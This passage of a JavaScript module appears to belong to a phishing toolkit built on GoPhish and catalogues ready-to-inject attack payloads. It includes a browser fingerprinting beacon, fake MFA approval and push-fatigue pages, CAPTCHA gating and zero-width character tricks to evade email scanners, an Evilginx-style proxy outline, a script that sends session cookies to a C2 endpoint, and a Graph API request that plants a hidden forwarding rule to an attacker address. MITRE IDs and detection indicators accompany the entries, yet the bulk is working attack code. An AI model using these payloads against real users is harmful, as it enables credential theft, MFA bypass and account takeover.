          bufferInterval: { type: "number", default: "2000", description: "Buffer interval in ms before sending" }
        },
        detectionIndicators: [
          "JavaScript keypress event listeners on document level",
          "Beacon/image requests with encoded keystroke data",
          "Clipboard paste event monitoring"
        ],
        prerequisites: ["JavaScript enabled in target browser"],
        tags: ["keylogger", "input-capture", "javascript", "credential-theft"],
        enablesRemoteAccess: false,
        effectiveness: 7
      },
      {
        id: "lp-browser-fingerprint",
        name: "Browser Fingerprinting & Reconnaissance",
        category: "landing_page_exploit",
        difficulty: "intermediate",
        description: "Collects detailed browser and system information from visitors: user agent, screen resolution, installed plugins, timezone, language, WebGL renderer (reveals GPU/hardware), canvas fingerprint, WebRTC local IP, and battery status. This intelligence feeds into targeted follow-up attacks.",
        mitreId: "T1592.004",
        mitreName: "Gather Victim Host Information: Client Configurations",
        mitreTactic: "Reconnaissance",
        target: "landing_page",
        landingPageCode: `<!-- Browser Fingerprinting & Recon -->
<script>
(function(){
  var fp = {};
  fp.ua = navigator.userAgent;
  fp.platform = navigator.platform;
  fp.lang = navigator.language;
  fp.langs = JSON.stringify(navigator.languages);
  fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  fp.tzOffset = new Date().getTimezoneOffset();
  fp.screen = screen.width+'x'+screen.height;
  fp.colorDepth = screen.colorDepth;
  fp.deviceMemory = navigator.deviceMemory || 'unknown';
  fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
  fp.cookieEnabled = navigator.cookieEnabled;
  fp.doNotTrack = navigator.doNotTrack;
  fp.touchPoints = navigator.maxTouchPoints || 0;
  
  // Canvas fingerprint
  try {
    var c = document.createElement('canvas');
    var ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('fingerprint',2,2);
    fp.canvas = c.toDataURL().slice(-50);
  } catch(e){}
  
  // WebGL renderer (reveals GPU)
  try {
    var gl = document.createElement('canvas').getContext('webgl');
    var dbg = gl.getExtension('WEBGL_debug_renderer_info');
    fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    fp.gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
  } catch(e){}
  
  // WebRTC local IP detection
  try {
    var pc = new RTCPeerConnection({iceServers:[]});
    pc.createDataChannel('');
    pc.createOffer().then(function(o){pc.setLocalDescription(o);});
    pc.onicecandidate = function(e){
      if(!e.candidate) return;
      var ip = e.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);
      if(ip) fp.localIP = ip[0];
      pc.close();
      sendFP();
    };
    setTimeout(function(){ if(!fp.localIP){ fp.localIP='blocked'; sendFP(); }}, 3000);
  } catch(e){ sendFP(); }
  
  function sendFP(){
    var img = new Image();
    img.src = '{{.URL}}?fp=' + encodeURIComponent(JSON.stringify(fp)) + '&t=' + Date.now();
  }
})();
</script>`,
        configOptions: {
          includeWebRTC: { type: "boolean", default: "true", description: "Include WebRTC IP leak detection" },
          includeWebGL: { type: "boolean", default: "true", description: "Include WebGL GPU fingerprinting" }
        },
        detectionIndicators: [
          "WebRTC peer connection created without media streams",
          "Canvas and WebGL fingerprinting API calls",
          "Large JSON payload sent via image beacon"
        ],
        prerequisites: [],
        tags: ["fingerprinting", "reconnaissance", "webrtc", "webgl", "canvas"],
        enablesRemoteAccess: false,
        effectiveness: 6
      },
      {
        id: "lp-fake-mfa-push",
        name: "Fake MFA Push Notification Landing Page",
        category: "landing_page_exploit",
        difficulty: "intermediate",
        description: "After capturing credentials, displays a fake 'waiting for MFA approval' screen with a simulated push notification animation. Meanwhile, the attacker uses the captured credentials to trigger a real MFA push. The user sees the real push on their phone and approves it, thinking it's related to the landing page.",
        mitreId: "T1621",
        mitreName: "Multi-Factor Authentication Request Generation",
        mitreTactic: "Credential Access",
        target: "landing_page",
        landingPageCode: `<!-- Fake MFA Push Waiting Screen -->
<div id="mfa-wait" style="max-width:400px;margin:60px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;text-align:center;">
  <div style="width:80px;height:80px;border-radius:50%;background:#e8f4fd;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;">
    <div style="width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:#0078d4;border-radius:50%;animation:spin 1s linear infinite;"></div>
  </div>
  <h2 style="font-size:20px;color:#1b1b1b;margin:0 0 8px;">Waiting for approval</h2>
  <p style="color:#666;font-size:14px;margin:0 0 24px;">We've sent a notification to your registered device.<br>Please approve the sign-in request.</p>
  
  <!-- Fake phone notification mockup -->
  <div style="background:#1e1e1e;border-radius:16px;padding:16px;max-width:280px;margin:0 auto;text-align:left;">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
      <div style="width:24px;height:24px;background:#0078d4;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:12px;">M</div>
      <span style="color:#999;font-size:12px;">Microsoft Authenticator</span>
      <span style="color:#666;font-size:11px;margin-left:auto;">now</span>
    </div>
    <p style="color:#fff;font-size:13px;margin:0 0 4px;"><strong>Approve sign-in?</strong></p>
    <p style="color:#aaa;font-size:12px;margin:0;">Are you trying to sign in to your account?</p>
    <div style="display:flex;gap:8px;margin-top:12px;">
      <div style="flex:1;background:#0078d4;color:#fff;text-align:center;padding:6px;border-radius:6px;font-size:12px;">Approve</div>
      <div style="flex:1;background:#333;color:#fff;text-align:center;padding:6px;border-radius:6px;font-size:12px;">Deny</div>
    </div>
  </div>
  
  <div style="margin-top:24px;">
    <p style="font-size:12px;color:#999;">Didn't receive the notification?</p>
    <a href="#" style="font-size:13px;color:#0078d4;text-decoration:none;" onclick="document.getElementById('mfa-alt').style.display='block';return false;">Use a different verification method</a>
  </div>
  
  <div id="mfa-alt" style="display:none;margin-top:16px;background:#f8f9fa;border-radius:8px;padding:16px;">
    <p style="font-size:13px;color:#333;margin:0 0 8px;">Enter verification code:</p>
    <form method="POST">
      <input type="text" name="mfa_code" maxlength="6" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:20px;text-align:center;letter-spacing:6px;box-sizing:border-box;" placeholder="______">
      <button type="submit" style="width:100%;margin-top:8px;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;font-size:14px;cursor:pointer;">Verify</button>
    </form>
  </div>
</div>
<style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>`,
        configOptions: {
          provider: { type: "select", default: "microsoft", description: "MFA provider to mimic (microsoft, duo, okta)" },
          showCodeFallback: { type: "boolean", default: "true", description: "Show 'enter code' fallback option" }
        },
        detectionIndicators: [
          "Fake MFA approval screen on non-IdP domain",
          "Simulated phone notification UI in browser",
          "MFA code input form on phishing page"
        ],
        prerequisites: ["Credentials already captured", "Target uses push-based MFA"],
        tags: ["mfa", "push-notification", "social-engineering", "microsoft-authenticator"],
        enablesRemoteAccess: true,
        effectiveness: 8
      },
      // ═══════════════════════════════════════════════════════════════════
      // EMAIL EVASION
      // ═══════════════════════════════════════════════════════════════════
      {
        id: "evasion-redirect-chain",
        name: "Multi-Hop Redirect Chain",
        category: "email_evasion",
        difficulty: "intermediate",
        description: "Uses a chain of legitimate redirect services to mask the final phishing URL. The email contains a link through Google AMP, Cloudflare Workers, or other trusted domains that ultimately redirect to the landing page. This bypasses URL reputation checks in email gateways.",
        mitreId: "T1566.002",
        mitreName: "Phishing: Spearphishing Link",
        mitreTactic: "Initial Access",
        target: "email_template",
        emailTemplateCode: `<!-- Redirect Chain URL Patterns (use in href) -->
<!-- Option 1: Google AMP cache -->
<!-- https://www.google.com/amp/s/PHISHING_DOMAIN/path -->

<!-- Option 2: Microsoft Safe Links passthrough -->
<!-- Use legitimate-looking URL that 302 redirects -->

<!-- Option 3: Cloudflare Workers redirect -->
<!-- https://worker-name.DOMAIN.workers.dev/?r=ENCODED_URL -->

<!-- Template with redirect-chain link -->
<p style="text-align:center;margin:20px 0;">
  <a href="{{.URL}}" style="display:inline-block;background:#0078d4;color:#fff;padding:12px 30px;border-radius:4px;text-decoration:none;font-weight:600;">
    Review Document
  </a>
</p>
<p style="font-size:11px;color:#999;text-align:center;">
  <a href="{{.URL}}" style="color:#999;text-decoration:none;word-break:break-all;">
    https://docs.google.com/document/d/1a2b3c4d5e/view
  </a>
</p>`,
        configOptions: {
          redirectService: { type: "select", default: "google-amp", description: "Redirect service to use (google-amp, cloudflare-worker, firebase)" },
          hops: { type: "number", default: "2", description: "Number of redirect hops" }
        },
        detectionIndicators: [
          "Multiple 302 redirects before reaching final destination",
          "URL uses Google AMP, Cloudflare Workers, or Firebase hosting",
          "Final destination domain differs from displayed link text"
        ],
        prerequisites: ["Redirect infrastructure set up"],
        tags: ["url-evasion", "redirect", "google-amp", "cloudflare", "email-gateway-bypass"],
        enablesRemoteAccess: false,
        effectiveness: 7
      },
      {
        id: "evasion-captcha-gate",
        name: "CAPTCHA-Gated Landing Page",
        category: "email_evasion",
        difficulty: "basic",
        description: "Adds a Cloudflare Turnstile or hCaptcha challenge before the phishing content. This prevents automated email security scanners from analyzing the landing page content, while real users pass through easily. The credential capture form only appears after CAPTCHA completion.",
        mitreId: "T1566.002",
        mitreName: "Phishing: Spearphishing Link",
        mitreTactic: "Initial Access",
        target: "landing_page",
        landingPageCode: `<!-- CAPTCHA-Gated Landing Page -->
<div id="captcha-gate" style="max-width:400px;margin:80px auto;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;text-align:center;">
  <div style="margin-bottom:24px;">
    <div style="width:48px;height:48px;background:#f0f0f0;border-radius:50%;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;font-size:24px;">\u{1F512}</div>
    <h2 style="font-size:18px;color:#1b1b1b;margin:0 0 4px;">Security Verification</h2>
    <p style="font-size:13px;color:#666;">Please complete the verification to continue</p>
  </div>
  <!-- Cloudflare Turnstile widget -->
  <div id="cf-turnstile" class="cf-turnstile" data-sitekey="TURNSTILE_SITE_KEY" data-callback="onCaptchaPass"></div>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
</div>
<div id="real-content" style="display:none;">
  <!-- Actual phishing content goes here -->
  <form method="POST" style="max-width:400px;margin:40px auto;font-family:sans-serif;">
    <h2>Sign in to continue</h2>
    <input type="email" name="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
    <input type="password" name="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
    <button type="submit" style="width:100%;padding:10px;background:#0078d4;color:#fff;border:none;border-radius:4px;cursor:pointer;">Sign in</button>
  </form>
</div>
<script>
function onCaptchaPass(token) {
  document.getElementById('captcha-gate').style.display = 'none';
  document.getElementById('real-content').style.display = 'block';
}
</script>`,
        configOptions: {
          captchaProvider: { type: "select", default: "turnstile", description: "CAPTCHA provider (turnstile, hcaptcha, recaptcha)" },
          siteKey: { type: "string", default: "TURNSTILE_SITE_KEY", description: "CAPTCHA site key" }
        },
        detectionIndicators: [
          "CAPTCHA challenge before login form",
          "Content hidden until CAPTCHA completion",
          "Legitimate CAPTCHA service used on phishing page"
        ],
        prerequisites: ["CAPTCHA service account (Turnstile is free)"],
        tags: ["captcha", "evasion", "anti-scanner", "cloudflare", "turnstile"],
        enablesRemoteAccess: false,
        effectiveness: 8
      },
      {
        id: "evasion-zero-width",
        name: "Zero-Width Character Email Obfuscation",
        category: "email_evasion",
        difficulty: "basic",
        description: "Inserts zero-width Unicode characters (U+200B, U+200C, U+200D, U+FEFF) between characters in suspicious keywords to bypass email content filters. The text appears normal to the human reader but keyword-based detection fails. Example: 'p\u200Ba\u200Bs\u200Bs\u200Bw\u200Bo\u200Br\u200Bd' with zero-width spaces.",
        mitreId: "T1036.005",
        mitreName: "Masquerading: Match Legitimate Name or Location",
        mitreTactic: "Defense Evasion",
        target: "email_template",
        emailTemplateCode: `<!-- Zero-Width Character Obfuscation -->
<!-- Insert &#8203; (zero-width space) between characters of sensitive keywords -->
<!-- Example: "password" becomes "p&#8203;a&#8203;s&#8203;s&#8203;w&#8203;o&#8203;r&#8203;d" -->
<!-- Example: "verify" becomes "v&#8203;e&#8203;r&#8203;i&#8203;f&#8203;y" -->
<!-- Example: "urgent" becomes "u&#8203;r&#8203;g&#8203;e&#8203;n&#8203;t" -->

<!-- Usage in template: -->
<p>Please v&#8203;e&#8203;r&#8203;i&#8203;f&#8203;y your account p&#8203;a&#8203;s&#8203;s&#8203;w&#8203;o&#8203;r&#8203;d to maintain access.</p>
<p>This is an u&#8203;r&#8203;g&#8203;e&#8203;n&#8203;t security notice regarding your a&#8203;c&#8203;c&#8203;o&#8203;u&#8203;n&#8203;t.</p>`,
        configOptions: {
          keywords: { type: "string", default: "password,verify,urgent,account,security,login", description: "Comma-separated keywords to obfuscate" },
          charType: { type: "select", default: "zwsp", description: "Zero-width character type (zwsp, zwnj, zwj)" }
        },
        detectionIndicators: [
          "Zero-width Unicode characters in email body",
          "Text that appears normal but contains hidden characters",
          "Keyword filter bypass via Unicode insertion"
        ],
        prerequisites: [],
        tags: ["unicode", "zero-width", "keyword-bypass", "email-filter-evasion"],
        enablesRemoteAccess: false,
        effectiveness: 6
      },
      // ═══════════════════════════════════════════════════════════════════
      // MFA BYPASS
      // ═══════════════════════════════════════════════════════════════════
      {
        id: "mfa-aitm-proxy",
        name: "Adversary-in-the-Middle (AiTM) Reverse Proxy",
        category: "mfa_bypass",
        difficulty: "expert",
        description: "Sets up a transparent reverse proxy (Evilginx-style) between the user and the real authentication server. The user sees and interacts with the real login page through the proxy. After authentication (including MFA), the proxy captures the session cookie/token, giving the attacker authenticated access. This is the most effective MFA bypass technique.",
        mitreId: "T1557",
        mitreName: "Adversary-in-the-Middle",
        mitreTactic: "Credential Access",
        target: "landing_page",
        landingPageCode: `<!-- AiTM Proxy Configuration Guide (not injectable - requires infrastructure) -->
<!-- 
  AiTM Setup Requirements:
  1. Domain with valid SSL certificate (Let's Encrypt)
  2. Evilginx2 or similar reverse proxy tool
  3. Phishlet configuration for target IdP
  
  Evilginx2 Phishlet Example (Microsoft 365):
  
  name: 'o365'
  params:
    - {name: 'login_domain', value: 'login.microsoftonline.com'}
    - {name: 'main_domain', value: 'www.office.com'}
  
  The landing page for AiTM is the proxy itself - 
  the email link points to the proxy domain which 
  transparently serves the real Microsoft login page.
  
  Captured artifacts:
  - Username and password (from form submission)
  - MFA token/code (from MFA step)
  - Session cookie (post-authentication)
  - OAuth tokens (if applicable)
-->
<div style="max-width:500px;margin:60px auto;font-family:sans-serif;text-align:center;padding:20px;">
  <h2 style="color:#333;">AiTM Proxy Landing</h2>
  <p style="color:#666;">This technique requires Evilginx2 infrastructure.</p>
  <p style="color:#666;">The proxy transparently serves the real login page.</p>
  <div style="background:#f8f9fa;border-radius:8px;padding:16px;margin:20px 0;text-align:left;">
    <p style="font-size:13px;color:#333;margin:0;"><strong>Captured artifacts:</strong></p>
    <ul style="font-size:13px;color:#666;">
      <li>Username + Password</li>
      <li>MFA code/push approval</li>
      <li>Session cookie (post-auth)</li>
      <li>OAuth refresh token</li>
    </ul>
  </div>
</div>`,
        configOptions: {
          targetIdp: { type: "select", default: "microsoft365", description: "Target identity provider (microsoft365, google, okta)" },
          proxyDomain: { type: "string", default: "", description: "Domain for the reverse proxy" }
        },
        detectionIndicators: [
          "Login page served from non-official domain",
          "SSL certificate for phishing domain (not Microsoft/Google)",
          "Session cookie issued from proxy domain, not IdP",
          "Unusual login location/device after successful auth"
        ],
        prerequisites: ["Evilginx2 or similar proxy infrastructure", "Domain with SSL", "Phishlet for target IdP"],
        tags: ["aitm", "evilginx", "reverse-proxy", "session-hijacking", "mfa-bypass"],
        enablesRemoteAccess: true,
        effectiveness: 10
      },
      {
        id: "mfa-push-fatigue",
        name: "MFA Push Fatigue (Prompt Bombing)",
        category: "mfa_bypass",
        difficulty: "intermediate",
        description: "After capturing credentials, repeatedly triggers MFA push notifications to the user's device until they approve one out of frustration or confusion. Combined with a social engineering pretext (e.g., 'IT is testing the MFA system, please approve the prompt'). The landing page shows a fake 'verification in progress' screen while push bombing occurs.",
        mitreId: "T1621",
        mitreName: "Multi-Factor Authentication Request Generation",
        mitreTactic: "Credential Access",
        target: "both",
        emailTemplateCode: `<!-- Push Fatigue Pretext Email -->
<div style="background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:16px;margin:16px 0;">
  <p style="font-size:14px;color:#856404;margin:0;"><strong>\u26A0\uFE0F MFA System Maintenance Notice</strong></p>
  <p style="font-size:13px;color:#856404;margin:8px 0 0;">The IT Security team is performing scheduled maintenance on our multi-factor authentication system today. You may receive multiple verification prompts on your device. <strong>Please approve the prompt when you receive it</strong> to complete the system validation.</p>
</div>`,
        landingPageCode: `<!-- Push Fatigue Waiting Screen -->
<div style="max-width:400px;margin:60px auto;font-family:sans-serif;text-align:center;">
  <div style="width:60px;height:60px;border-radius:50%;background:#e8f4fd;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;">
    <div style="width:30px;height:30px;border:3px solid #e0e0e0;border-top-color:#0078d4;border-radius:50%;animation:spin 1s linear infinite;"></div>
  </div>
  <h2 style="font-size:18px;color:#333;">MFA Verification in Progress</h2>
  <p style="color:#666;font-size:14px;">A verification request has been sent to your device.</p>
  <p style="color:#666;font-size:14px;">Please <strong>approve the prompt</strong> on your phone to continue.</p>
  <div style="background:#f8f9fa;border-radius:8px;padding:12px;margin:20px 0;">
    <p style="font-size:12px;color:#999;margin:0;">Attempt <span id="attempt-count">1</span> of 5</p>
    <p style="font-size:12px;color:#999;margin:4px 0 0;">If you don't see a prompt, check your authenticator app.</p>
  </div>
</div>
<style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>
<script>
var count = 1;
setInterval(function(){
  if(count < 5) {
    count++;
    document.getElementById('attempt-count').textContent = count;
  }
}, 15000);
</script>`,
        configOptions: {
          maxAttempts: { type: "number", default: "5", description: "Maximum push attempts before giving up" },
          intervalSeconds: { type: "number", default: "15", description: "Seconds between push attempts" }
        },
        detectionIndicators: [
          "Multiple MFA push requests in short succession",
          "MFA approval from unusual location/time",
          "Email pretext about MFA system maintenance"
        ],
        prerequisites: ["Valid credentials already captured", "Target uses push-based MFA"],
        tags: ["mfa-fatigue", "push-bombing", "social-engineering", "persistence"],
        enablesRemoteAccess: true,
        effectiveness: 7
      },
      // ═══════════════════════════════════════════════════════════════════
      // POST-CREDENTIAL
      // ═══════════════════════════════════════════════════════════════════
      {
        id: "post-session-hijack",
        name: "Session Cookie Theft & Replay",
        category: "post_credential",
        difficulty: "advanced",
        description: "After the user authenticates on the landing page (especially via AiTM proxy), captures the session cookie and immediately replays it to establish an authenticated session. The attacker can then access the user's account without needing credentials or MFA again, as long as the session remains valid.",
        mitreId: "T1539",
        mitreName: "Steal Web Session Cookie",
        mitreTactic: "Credential Access",
        target: "landing_page",
        landingPageCode: `<!-- Session Cookie Capture (append to AiTM landing page) -->
<script>
(function(){
  // Capture all cookies and send to C2
  function exfilCookies() {
    var cookies = document.cookie;
    if(!cookies) return;
    var img = new Image();
    img.src = '{{.URL}}?cookies=' + encodeURIComponent(cookies) + '&url=' + encodeURIComponent(window.location.href) + '&t=' + Date.now();
  }
  // Run on page load and after any navigation
  exfilCookies();
  // Monitor for new cookies (post-auth)
  var lastCookies = document.cookie;
  setInterval(function(){
    if(document.cookie !== lastCookies) {
      lastCookies = document.cookie;
      exfilCookies();
    }
  }, 1000);
})();
</script>`,
        configOptions: {
          c2Endpoint: { type: "string", default: "{{.URL}}", description: "C2 endpoint for cookie exfiltration" },
          pollInterval: { type: "number", default: "1000", description: "Cookie change polling interval in ms" }
        },
        detectionIndicators: [
          "Cookie values sent to external endpoint",
          "Session used from different IP/location than authentication",
          "Interval-based cookie monitoring in JavaScript"
        ],
        prerequisites: ["AiTM proxy or XSS on target domain"],
        tags: ["session-hijacking", "cookie-theft", "replay-attack", "persistence"],
        enablesRemoteAccess: true,
        effectiveness: 9
      },
      {
        id: "post-email-rule",
        name: "Email Forwarding Rule Persistence",
        category: "post_credential",
        difficulty: "intermediate",
        description: "After gaining access to a user's email account, automatically creates a hidden email forwarding rule that sends copies of all incoming emails to an attacker-controlled address. This provides persistent email access even if the user changes their password. The landing page captures credentials and the backend immediately creates the rule via API.",
        mitreId: "T1114.003",
        mitreName: "Email Collection: Email Forwarding Rule",
        mitreTactic: "Collection",
        target: "landing_page",
        landingPageCode: `<!-- Post-auth instruction for email rule creation -->
<!-- This is a backend operation, not a landing page injection -->
<!-- After credential capture, use Microsoft Graph API or Exchange Web Services:
  
  POST https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules
  Authorization: Bearer {stolen_token}
  Content-Type: application/json
  
  {
    "displayName": "Security Audit Log",
    "sequence": 1,
    "isEnabled": true,
    "conditions": {
      "bodyContains": [""]
    },
    "actions": {
      "forwardTo": [
        {
          "emailAddress": {
            "name": "Security Audit",
            "address": "attacker@external-domain.com"
          }
        }
      ],
      "markAsRead": true,
      "moveToFolder": "inbox"
    }
  }
-->
<div style="max-width:400px;margin:60px auto;font-family:sans-serif;text-align:center;">
  <div style="font-size:48px;margin-bottom:16px;">\u2705</div>
  <h2 style="color:#333;">Verification Complete</h2>
  <p style="color:#666;">Your account has been verified successfully.</p>
  <p style="color:#666;font-size:13px;">You will be redirected shortly...</p>
</div>
<script>setTimeout(function(){ window.location = 'REDIRECT_URL'; }, 3000);</script>`,
        configOptions: {
          forwardAddress: { type: "string", default: "", description: "Email address to forward captured emails to" },
          ruleName: { type: "string", default: "Security Audit Log", description: "Name for the hidden email rule" }
        },
        detectionIndicators: [
          "New email forwarding rule created via API",
          "Rule forwarding to external domain",
          "Rule created from unusual IP/location"
        ],
        prerequisites: ["Valid OAuth token or session cookie", "Target uses Microsoft 365 or Google Workspace"],
        tags: ["persistence", "email-forwarding", "microsoft-graph", "post-exploitation"],
        enablesRemoteAccess: true,
        effectiveness: 8
      }
    ];
    EXPLOIT_CATEGORIES = {
      credential_harvesting: {
        label: "Credential Harvesting",
        description: "Advanced techniques for capturing credentials beyond basic form submission",
        icon: "KeyRound",
        color: "#e74c3c"
      },
      payload_delivery: {
        label: "Payload Delivery",
        description: "Methods for delivering malicious payloads via phishing emails and landing pages",
        icon: "Package",
        color: "#f59e0b"
      },
      landing_page_exploit: {
        label: "Landing Page Exploits",
        description: "JavaScript-based exploits injected into GoPhish landing pages",
        icon: "Code",
        color: "#8b5cf6"
      },
      email_evasion: {
        label: "Email Evasion",
        description: "Techniques to bypass email security gateways and content filters",
        icon: "ShieldOff",
        color: "#6366f1"
      },
      mfa_bypass: {
        label: "MFA Bypass",
        description: "Techniques to circumvent multi-factor authentication controls",
        icon: "Unlock",
        color: "#dc2626"
      },
      post_credential: {
        label: "Post-Credential",
        description: "Persistence and lateral movement after initial credential capture",
        icon: "Footprints",
        color: "#059669"
      }
    };
  }
});

export {
  PHISHING_EXPLOITS,
  EXPLOIT_CATEGORIES,
  matchPhishingExploits,
  getExploitsByCategory,
  getExploitsForTarget,
  enhanceLandingPage,
  enhanceEmailTemplate,
  getPhishingMitreTechniques,
  init_phishing_exploits
};
